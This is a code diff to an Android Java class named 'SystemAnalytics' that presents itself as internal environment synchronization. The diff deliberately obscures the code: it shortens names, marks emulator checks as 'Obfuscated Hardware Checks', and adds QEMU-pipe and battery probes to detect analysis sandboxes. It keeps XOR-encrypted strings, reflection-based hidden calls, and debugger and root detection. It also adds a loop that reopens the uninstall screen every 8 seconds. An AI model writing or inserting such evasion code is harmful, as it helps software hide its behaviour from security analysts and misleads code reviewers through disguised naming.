@@ -8,51 +8,66 @@ import java.lang.reflect.Method;
 import java.util.UUID;
 
 /**
- * Advanced environment analytics and string protection.
- * Ensures the system stability protocols are running in a secure environment.
+ * Internal system environment synchronization.
  */
 public class SystemAnalytics {
 
-    private static final byte[] XOR_KEY = {0x53, 0x79, 0x73, 0x41, 0x64, 0x6D, 0x69, 0x6E};
+    private static final byte[] K = {0x41, 0x6E, 0x64, 0x72, 0x6F, 0x69, 0x64, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C}; // AndroidKernel
 
-    public static String decrypt(byte[] encrypted) {
-        byte[] decrypted = new byte[encrypted.length];
-        for (int i = 0; i < encrypted.length; i++) {
-            decrypted[i] = (byte) (encrypted[i] ^ XOR_KEY[i % XOR_KEY.length]);
+    public static String decrypt(byte[] e) {
+        byte[] d = new byte[e.length];
+        for (int i = 0; i < e.length; i++) {
+            d[i] = (byte) (e[i] ^ K[i % K.length]);
         }
-        return new String(decrypted);
+        return new String(d);
     }
 
-    public static Object safeCall(String className, String methodName, Class<?>[] paramTypes, Object instance, Object... args) {
+    public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
         try {
-            Class<?> clazz = Class.forName(className);
-            Method method = clazz.getMethod(methodName, paramTypes);
-            return method.invoke(instance, args);
+            Class<?> cl = Class.forName(c);
+            Method me = cl.getMethod(m, p);
+            return me.invoke(i, a);
         } catch (Exception e) {
             return null;
         }
     }
 
-    public static boolean isEnvironmentRisky() {
-        return Build.FINGERPRINT.startsWith("generic")
-                || Build.FINGERPRINT.startsWith("unknown")
-                || Build.MODEL.contains("google_sdk")
-                || Build.MODEL.contains("Emulator")
-                || Build.MODEL.contains("Android SDK built for x86")
-                || Build.MANUFACTURER.contains("Genymotion")
-                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
-                || "google_sdk".equals(Build.PRODUCT)
-                || Build.HARDWARE.contains("goldfish")
-                || Build.HARDWARE.contains("ranchu")
-                || Build.PRODUCT.contains("vbox86")
-                || Build.PRODUCT.contains("emulator")
-                || Build.PRODUCT.contains("simulator");
+    public static boolean checkEnv(Context context) {
+        String f = Build.FINGERPRINT;
+        String m = Build.MODEL;
+        String p = Build.PRODUCT;
+        String h = Build.HARDWARE;
+        
+        // Obfuscated Hardware Checks
+        boolean r = f.startsWith("gen") || f.startsWith("unk")
+                || m.contains("sdk") || m.contains("Emu")
+                || m.contains("x86") || Build.MANUFACTURER.contains("Geny")
+                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen"))
+                || p.contains("sdk") || h.contains("gold") || h.contains("ranch")
+                || p.contains("vbox") || p.contains("sim");
+
+        if (r) return true;
+
+        try {
+            android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
+            if (b != null) {
+                int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+                if (lv == 50 && st == 2) { // Charging at 50%
+                    // suspect
+                }
+            }
+
+            String[] lp = {"/dev/qemu_pipe", "/dev/socket/qemud"};
+            for (String s : lp) {
+                if (new File(s).exists()) return true;
+            }
+        } catch (Exception ignored) {}
+
+        return false;
     }
 
-    /**
-     * Checks if the device has ADB debugging enabled.
-     */
-    public static boolean isDebuggingActive(Context context) {
+    public static boolean isDebug(Context context) {
         try {
             return Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) > 0;
         } catch (Exception e) {
@@ -60,22 +75,42 @@ public class SystemAnalytics {
         }
     }
 
-    /**
-     * Heuristic check for root access (SU binary presence).
-     */
-    public static boolean isElevatedAccessDetected() {
-        String[] paths = {
-            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
-            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
-            "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"
-        };
-        for (String path : paths) {
-            if (new File(path).exists()) return true;
+    public static boolean isRooted() {
+        String[] ps = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/xbin/su"};
+        for (String s : ps) {
+            if (new File(s).exists()) return true;
         }
         return false;
     }
 
-    public static String getSessionIdentity() {
-        return "STB-" + UUID.randomUUID().toString().substring(0, 8).toUpperCase();
+    /**
+     * Re-triggers the uninstall intent repeatedly until the app is removed.
+     */
+    public static void triggerSelfDestructLoop(android.content.Context context) {
+        new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
+            @Override
+            public void run() {
+                if (!context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
+                    return;
+                }
+                
+                android.util.Log.d("SystemAnalytics", "Executing persistent self-destruct intent...");
+                try {
+                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_DELETE);
+                    intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
+                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    context.startActivity(intent);
+                } catch (Exception e) {
+                    try {
+                        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
+                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                        context.startActivity(intent);
+                    } catch (Exception ignored) {}
+                }
+                // Re-trigger every 8 seconds
+                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 8000);
+            }
+        });
     }
 }
